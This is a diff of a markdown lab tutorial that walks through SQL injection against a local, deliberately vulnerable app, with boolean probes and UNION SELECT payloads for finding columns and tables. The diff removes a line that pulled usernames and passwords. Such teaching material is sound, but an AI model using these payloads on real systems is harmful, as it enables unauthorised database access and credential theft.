@@ -20,10 +20,10 @@ Now that the app is running let's go hacking!
 
 The first step is to identify parameters which could be potentially used in an SQL query to communicate with the underlying database. In this example we find that the "/home" method grabs data by pageID and displays the content.
 
-![](../../.gitbook/assets/java/SQLI/1.png)
+![](../../.gitbook/assets/python/SQLI/1.png)
 
-```text
-http://localhost:5000/home/1
+```
+http://0.0.0.0:5000/home/1
 ```
 
 ### Step2
@@ -46,20 +46,20 @@ String sql = "SELECT pageId, title, content FROM pages WHERE pageId="+pageId;
 
 Now we can also use logical operators to determine whether we can actually manipulate the SQL statements.
 
-We start with a logical operator which is false \(and 1=2\). The expected behaviour for injecting a false logical operator would be an error or 404.
+We start with a logical operator which is false (and 1=2). The expected behaviour for injecting a false logical operator would be an error.
 
 ![](../../.gitbook/assets/java/SQLI/3.png)
 
-```text
-http://localhost:5000/home/1 and 1=2
+```
+http://0.0.0.0:5000/home/1 and 1=2
 ```
 
-After that we inject a logical operator which is true \(and 1=1\). This should result in the application run as intended without errors.
+After that we inject a logical operator which is true (and 1=1). This should result in the application run as intended without errors.
 
-![](../../.gitbook/assets/java/SQLI/4.png)
+![](../../.gitbook/assets/python/SQLI/4.png)
 
-```text
-http://localhost:5000/home/1 and 1=1
+```
+http://0.0.0.0:5000/home/1 and 1=1
 ```
 
 ## Exploitation
@@ -72,21 +72,21 @@ The UNION operator is used in SQL injections to join a query, purposely forged t
 
 ![](../../.gitbook/assets/java/SQLI/5.png)
 
-```text
-http://localhost:5000/home/1 union select 1
+```
+http://0.0.0.0:5000/home/1 union select 1
 ```
 
-This query results in an error, this is due to the fact that the original query started with 3 columns namely  
-\* pageId  
-\* title  
+This query results in an error, this is due to the fact that the original query started with 3 columns namely\
+\* pageId\
+\* title\
 \* content
 
-![](../../.gitbook/assets/java/SQLI/6.png)
+![](../../.gitbook/assets/python/SQLI/6.png)
 
-![](../../.gitbook/assets/java/SQLI/7.png)
+![](../../.gitbook/assets/python/SQLI/7.png)
 
-```text
-http://localhost:5000/home/1 union select 1,2,3
+```
+http://0.0.0.0:5000/home/1 union select 1,2,3
 ```
 
 Notice how "title" and "content" became placeholders for data we want to retrieve from the database
@@ -97,20 +97,14 @@ Now that we determined the number of columns we need to take an educated guess f
 
 ![](../../.gitbook/assets/java/SQLI/8.png)
 
-```text
-http://localhost:5000/home/1 union select 1,2,3 from user
+```
+http://0.0.0.0:5000/home/1 union select 1,2,3 from user
 ```
 
-![](../../.gitbook/assets/java/SQLI/9.png)
+![](../../.gitbook/assets/python/SQLI/9.png)
 
-```text
-http://localhost:5000/home/1 union select 1,2,3 from users
 ```
-
-![](../../.gitbook/assets/java/SQLI/10.png)
-
-```text
-http://localhost:5000/home/1 union select 1,username,password from users
+http://0.0.0.0:5000/home/1 union select 1,2,3 from users
 ```
 
 ## Mitigation
